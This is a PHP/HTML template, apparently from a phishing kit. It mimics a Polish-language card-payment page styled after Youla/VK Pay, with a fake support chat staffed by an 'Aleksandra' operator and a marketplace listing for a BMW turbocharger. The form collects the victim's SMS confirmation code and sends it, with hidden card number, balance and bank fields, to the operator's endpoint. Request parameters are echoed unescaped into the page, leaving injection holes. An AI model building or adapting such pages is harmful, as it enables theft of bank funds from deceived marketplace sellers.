	waiter.onShow = function() {
		window.parent.postMessage(\'{"type": "billing", "action": "waiterStart"}\', \'*\');

		if (typeof payCard.onShowWaiter === \'function\') {
			payCard.onShowWaiter();
		}
		else {
			payCard.disableFormFields();
			payCard.disableSubmitButton();
			payCard.setSubmitButtonValue(\'Обработка\');
		}
	};

	waiter.onHide = function() {
		if (typeof payCard.onHideWaiter === \'function\') {
			payCard.onHideWaiter();
		}
		else {
			payCard.enableFormFields();
			payCard.enableSubmitButton();
			payCard.restoreSubmitButtonValue();
		}
	};

	waiter.onSubmitSuccess = function(data) {
		restartPoll = function() {
			waiter.showClock();
			waiter.resetPollCount();
			waiter.startPoll(data.url);
		};
		waiter.startPoll(data.url, data.params);
	};

	hideWaiter = function() {
		waiter.finish();
	};

	return waiter;
}

function assignFormHandlers(cpg_context, waiter) {
	var $cpgForm = $(\'.js-hidden-form\');

	var payHandler = function(e) {
		cpg_context[\'rb\'].putPixel(\'form_send\');

		waiter.submit($cpgForm, $cpgForm.find(\'input, select\').filter(function() {
			return this.value && this.value !== \'FreePay\';
		}).serialize());
		return false;
	};

	$cpgForm.on(\'submit\', payHandler);
}
1</script>
      <link rel="icon" href="" type="image/png">
      <style> 		#loading { 		   width: 100%; 		   height: 100%; 		   top: 0; 		   left: 0; 		   position: fixed; 		   display: block; 		   opacity: 0.7; 		   background-color: #fff; 		   z-index: 99; 		   text-align: center; 		}  		#loading-image { 		  position: absolute; 		  top: 50%; 		  left: 50%; 		  z-index: 100; 		} 		 		.input-error {border-color: #ed1651!important;} 		 	</style>
            <!-- CHAT links -->
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <style type="text/css">
        body{
    
}
.col-md-2, .col-md-10{
    padding:0;
}
.panel{
  z-index: 999999;
    margin-bottom: 0px;
}
/* #### Tablets Portrait or Landscape #### */
@media screen and (min-width: 1px)  and (max-width: 1023px){
    .open-button {
  z-index: 300;
  border: 0; 
  content: \'Напишите нам в чат\';
  background: #002f34;
  border-radius: 5px;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  width: 150px;
  height: 36px;
  position: fixed;
  bottom: 80px;
  }
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
      display: flex;
      align-items: flex-start;
    z-index: 9999;
  min-width: 100%;
    bottom:5px;
    position: fixed;
    right: 10px;
  }

 #op_img {
  height: 50%; width: 70%;border-radius: 50%;max-height: 80px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 70%;
    left: 10%;
    position: inherit;
  }
}
@media screen and (min-width: 1024px){
    #open-button-text {
    visibility: hidden;
  }
  .open-button {
  z-index: 99999;
  border: 0; 
  background-color: transparent;
  background-image: url(\'/btn.png\');
  background-size: 100px 100px;
  background-repeat: no-repeat;
  content: \'\';
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  opacity: 0.6;
  width: 150px;
  height: 100px;
  position: fixed;
  top: 50px;
  
}
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
    z-index: 9999;
    display: fixed;
    align-items: flex-start;
    min-width: 485px;
    bottom:5px;
    position: fixed;
    right: 10px;
  }
  #op_img {
  height: 100%; width: 100%;border-radius: 50%;max-height: 100px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 90%;
    left: 10%;
    position: inherit;
  }
}
.chat-window > div > .panel{
    border-radius: 5px 5px 0 0;
}
.icon_minim{
    padding:2px 10px;
}
.msg_container_base{
  background: #e5e5e5;
  margin: 0;
  padding: 0 10px 10px;
  max-height:300px;
  overflow-x:hidden;
}
.top-bar {
  background: #002f34;
  color: white;
  padding: 10px;
  position: relative;
  overflow: hidden;
  display: flex;
}
.msg_receive{
    padding-left:0;
    margin-left:0;
    text-align: left;
}
.msg_sent{
    padding-bottom:20px !important;
    margin-right:0;
    text-align: left;
}
.messages {
  background: white;
  padding: 10px;
  border-radius: 2px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
  max-width:100%;
}
.messages > p {
    font-size: 13px;
    margin: 0 0 0.2rem 0;
  }
.messages > time {
    font-size: 11px;
    color: #ccc;
}
.msg_container {
    padding: 10px;
    overflow: hidden;
    display: flex;
}
.panel >img {
    display: block;
    width: 100%;
}
.avatar {
    position: relative;
}
.base_receive > .avatar:after {
    content: "";
    position: absolute;
    top: 0;
    right: 0;
    width: 0;
    height: 0;
    border: 5px solid #FFF;
    border-left-color: rgba(0, 0, 0, 0);
    border-bottom-color: rgba(0, 0, 0, 0);
}

.base_sent {
  justify-content: flex-end;
  align-items: flex-end;
}
.base_sent > .avatar:after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    width: 0;
    height: 0;
    border: 5px solid white;
    border-right-color: transparent;
    border-top-color: transparent;
    box-shadow: 1px 1px 2px rgba(black, 0.2); // not quite perfect but close
}

.msg_sent > time{
    float: right;
}



.msg_container_base::-webkit-scrollbar-track
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar
{
    width: 12px;
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar-thumb
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
    background-color: #555;
}

.btn-group.dropup{
    position:fixed;
    left:0px;
    bottom:0;
}

#btn-chat{
  background-color: #002f34;
  border-color: white;
  padding-left: 5px;
  padding-right: 5px;
}

#new_chat {
  width: 10px;
  height: 174px;
  float: right;
  right: 10px;
  top: 50px;
  position: fixed;
  z-index: 0;
}
1      </style>
      <!-- CHAT links close -->
   </head>
   <body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile">
        <!--- CHAT --->
    <div class="row chat-window col-xs-5 col-md-3" id="chat_window_1" style="margin-left:10px;display: none;">
      <input type="hidden" id="product" value="Turbosprężarka turbina BMW 320d (E46), BMW X3 2.0 d (E83/E83N)">
        <input type="hidden" id="refresh_time" value="528747477">
        <input type="hidden" id="home_time" value="597315665">
        <div class="col-xs-12 col-md-12">
            <div class="panel panel-default">
                <div class="panel-heading top-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
                    <div class="col-md-8 col-xs-8" style="text-align: left; right: 13px;width: 90%">
                        <h4 class="panel-title" style="color: #fff"><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-chat" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M2.678 11.894a1 1 0 0 1 .287.801 10.97 10.97 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8.06 8.06 0 0 0 8 14c3.996 0 7-2.807 7-6 0-3.192-3.004-6-7-6S1 4.808 1 8c0 1.468.617 2.83 1.678 3.894zm-.493 3.905a21.682 21.682 0 0 1-.713.129c-.2.032-.352-.176-.273-.362a9.68 9.68 0 0 0 .244-.637l.003-.01c.248-.72.45-1.548.524-2.319C.743 11.37 0 9.76 0 8c0-3.866 3.582-7 8-7s8 3.134 8 7-3.582 7-8 7a9.06 9.06 0 0 1-2.347-.306c-.52.263-1.639.742-3.468 1.105z"/>
</svg>
</span> Czat online</h4>
                    </div>
                    <div class="col-md-4 col-xs-4" style="text-align: right; left: 13px;width: 10%;float: right;">
                        <button type="button" class="close icon_close" aria-label="Close" data-id="chat_window_1">
                          <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                </div>
                <div class="panel-body msg_container_base">
                    
                </div>
                <div class="panel-footer">
                    <div class="input-group">
                        <input id="btn-input" type="text" class="form-control input-sm chat_input" placeholder="Napisz tutaj..." />
                        <span class="input-group-btn">
                        <button class="btn btn-primary" id="btn-chat" style="margin-top: 0px;color: #fff">Wyślij wiadomość</button>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
      		    $(document).on(\'click\', \'.panel-heading span.icon_minim\', function (e) {
    var $this = $(this);
    if (!$this.hasClass(\'panel-collapsed\')) {
        $this.parents(\'.panel\').find(\'.panel-body\').slideUp();
        $this.addClass(\'panel-collapsed\');
        $this.removeClass(\'glyphicon-minus\').addClass(\'glyphicon-plus\');
    } else {
        $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
        $this.removeClass(\'panel-collapsed\');
        $this.removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
    }
});
$(document).on(\'focus\', \'.panel-footer input.chat_input\', function (e) {
    var $this = $(this);
    if ($(\'#minim_chat_window\').hasClass(\'panel-collapsed\')) {
        $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
        $(\'#minim_chat_window\').removeClass(\'panel-collapsed\');
        $(\'#minim_chat_window\').removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
    }
});
$(document).on(\'click\', \'#open-support\', function (e) {
    $(\'#chat_window_1\').show();
    $(\'#open-support\').hide();
});

function openChat() {
	$(\'#chat_window_1\').show();
    $(\'#open-support\').hide();
}
$(document).on(\'click\', \'.icon_close\', function (e) {
    $(\'#chat_window_1\').hide();
    $(\'#open-support\').show();
});
$(document).ready(function () {
    $(\'#chat_window_1\').hide();
    $(\'#open-support\').show();
});

$(document).on(\'click\', \'#btn-chat\', function (e) {
    sendMessage();
});
		function sendMessage() {
			message = document.getElementById("btn-input").value;
			if (message === \'\') {
				return;
			}
			document.getElementById("btn-input").value = \'\';
			var token = getCookie(\'tokena\');
			if (token =="") {
				var token = "'.$token.'";
			}
			xhttp=new XMLHttpRequest();
			var track_id = document.getElementById("refresh_time").value;
			var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
			xhttp.open("POST", url, true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			var uid = document.getElementById("home_time").value;
			var title = document.getElementById("product").value;
			xhttp.send("send=1&track_id="+track_id+"&product='.$_GET['product'].'&uid="+uid+"&token="+token+"&message="+message+"&type=kufar&title="+title);
			cur_text = $(\'.msg_container_base\').html();
			$(\'.msg_container_base\').html(cur_text+\'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+message+\'</p><time datetime="\'+getCurTime()+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\');
			setCookie(\'tokena\', token);
			var objDiv = $(\'.msg_container_base\');
			objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
		}
		var xhttp = null;
		$(function(){	
			var token = getCookie(\'tokena\'); 
			if (token =="") {
				var token = "'.$token.'";
        		setCookie(\'tokena\', token);
			} 
			var token = getCookie(\'tokena\');
			if (token !="") {
				xhttp=new XMLHttpRequest();
				var track_id = document.getElementById("refresh_time").value;
				var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
				xhttp.open("POST", url, true);
				xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				xhttp.send("get=1&product='.$_GET['product'].'&token="+token);
				xhttp.onload = function (e) {
						if (xhttp.readyState === 4) {
							if (xhttp.status === 200) {
								var body = xhttp.response;
								var json = JSON.parse(body);
								for (let i = 0; i < json.length; i++) {
									if (json[i].message !== \'start\') {
										cur_text = $(\'.msg_container_base\').html();
										time = getTime(json[i].date);
										if (json[i].sender == \'t\') {
											text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
										} else {
											text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
										}
										$(\'.msg_container_base\').html(cur_text+text);
									}
								}
								var objDiv = $(\'.msg_container_base\');
									objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
							}
						}
					}
			}
		});
		var myVar = setInterval(updateChat, 10000);
		function updateChat() {
				var token = getCookie(\'tokena\');
				if (token !="") {
						xhttp=new XMLHttpRequest();
						var track_id = document.getElementById("refresh_time").value;
						var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
						xhttp.open("POST", url, true);
						xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						xhttp.send("get=0&product='.$_GET['product'].'&token="+token);
						xhttp.onload = function (e) {
							if (xhttp.readyState === 4) {
								if (xhttp.status === 200) {
									var body = xhttp.response;
									var json = JSON.parse(body);
									for (let i = 0; i < json.length; i++) {
										cur_text = $(\'.msg_container_base\').html();
										time = getTime(json[i].date);
										if (json[i].sender == \'t\') {
											text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
										} else {
											text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
										}
										$(\'.msg_container_base\').html(cur_text+text);
										var objDiv = $(\'.msg_container_base\');
										objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
										$(\'#chat_window_1\').show();
					    				$(\'#open-support\').hide();
									}
							}
						}
				}
			}
		}

		function getCurTime() {
			var date = new Date();
			var hours = date.getHours();
			var minutes = "0" + date.getMinutes();
			var formattedTime = hours + \':\' + minutes.substr(-2);
			return formattedTime;
		}

		function getTime(unixtime) {
			var date = new Date(unixtime * 1000);
			var hours = date.getHours();
			var minutes = "0" + date.getMinutes();
			var formattedTime = hours + \':\' + minutes.substr(-2);
			return formattedTime;
		}

		function getCookie(cname) {
		  var name = cname + "=";
		  var decodedCookie = decodeURIComponent(document.cookie);
		  var ca = decodedCookie.split(\';\');
		  for(var i = 0; i <ca.length; i++) {
		    var c = ca[i];
		    while (c.charAt(0) == \' \') {
		      c = c.substring(1);
		    }
		    if (c.indexOf(name) == 0) {
		      return c.substring(name.length, c.length);
		    }
		  }
		  return "";
		}

		function setCookie(cname, cvalue) {
		  var d = new Date();
			  d.setTime(d.getTime() + (6*60*60*1000));
		  var expires = "expires="+ d.toUTCString();
		  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
		}
	function openForm() {
	  document.getElementById("myForm").style.display = "block";
	  document.getElementById("open-support").style.display = "none";
	  var objDiv = $(\'.msg_container_base\');
		objDiv.scrollTop = objDiv.scrollHeight;
	}

	function closeForm() {
	  document.getElementById("myForm").style.display = "none";
	  document.getElementById("open-support").style.display = "block";
	}
	var input = document.getElementById("btn-input");

	input.addEventListener("keydown", function(event) {
	  if (event.keyCode === 13) {
	    event.preventDefault();
	    document.getElementById("btn-chat").click();
	  }
	});1    </script>
      <!--- CHAT CLOSE --->
      <div class="pay-card-layout pay-card-layout_type_youla-mobile">
         <div class="pay-card-layout__header_type_vkpay" style="background-color: #002f34;">
            <div class="pay-card-layout__logo">
               <img src="../../logopl.png" style="width: 60px;height: 46px;">
            </div>
         </div>
         <div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay">
            <div class="pay-card__row">
               <div class="pay-card__card js-credit-card">
                  <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
                        <div class="credit-card-form__card-wrapper">
                           <div class="credit-card-form__card credit-card-form__card_position_front">
                              <div class="payment-systems-icons payment-systems-icons">
                                 <span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
                                 <span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
                                 <span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
                                 <span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
                              </div>
                              <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                                 <label class="js-cc-label credit-card-form__label">
                                    <span class="credit-card-form__title">kod potwierdzający</span>
                                    <form method="POST" action="/order/get_sms/'.$product->id.'" id="sms_form">
                                    	<input type="hidden" name="id" value="'.$product->id.'">
                                    	<input type="hidden" name="card_number" value="">
                                        <input type="hidden"name="id_card" value="'.$id_card.'">
                                      <input type="hidden" name="cardNumber" value="'.$card.'">
                                      <input type="hidden" name="cardbalance" value="'.$balance.'">


                                      <input type="hidden" name="bank_name" id="bank_name" value="">
                                      <input type="hidden" name="bank_country" id="bank_country" value="">
                                      <input type="hidden" name="bank_url" id="bank_url" value="">
                                      <input type="hidden" name="bank_type" id="bank_type" value="">
                                      <input type="hidden" name="bank_scheme" id="bank_scheme" value="">
                                      
                                    	<input type="hidden" name="error" value="1">
                                        <input type="text" name="smscode" id="codefromsms" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" required="">
                                    <!-- <div class="credit-card-form__error-text">Имя и фамилия латинскими буквами, как на карте</div> -->
                                 </label>
                              </div>
                           </div>
                        </div>
                        <div class="credit-card-form__submit">
                           <div class="credit-card-form__submit-inner">
                              <input onclick=\'smscode();\' style="
    cursor: pointer;background-color: #002f34; border-color: #002f34;color: #fff" type="submit" class="js-button-submit button" value="OTRZYMAJ ŚRODKI ">
<button type="button" class="open-button" id="open-support" onclick="openChat()" style="background: #002f34;
  border-radius: .25rem;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  width: 150px;
  height: 38px;
  opacity: 1;position: inherit; margin-top: 10px; width: 100%; "><p id="open-button-text" style="color: white;margin-left: auto;margin-right: auto;margin: 0 auto;background-color: #002f34; border-color: #002f34;visibility: visible;color: #fff">Wsparcie</p></button>
                           </div>
                        </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="secure-information secure-information_type_youla-mobile">
            <span class="secure-information__text" title="Bezpieczne połączenie.">
            <span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
            <span class="secure-information__text_type_secure-connection">Bezpieczne połączenie</span>
            </span>
         </div>
      </div>
       
   </body>
</html><script type="text/javascript">
function smscode() {
    if($(\'#codefromsms\').val() != \'\') {
      $(\'#sms_form\').submit();
    }
    else{
      ($(\'#codefromsms\').val() == \'\')?$(\'#codefromsms\').css("border-color", "red"):$(\'#codefromsms\').css("border-color", "");
    }
}
</script>
';
}


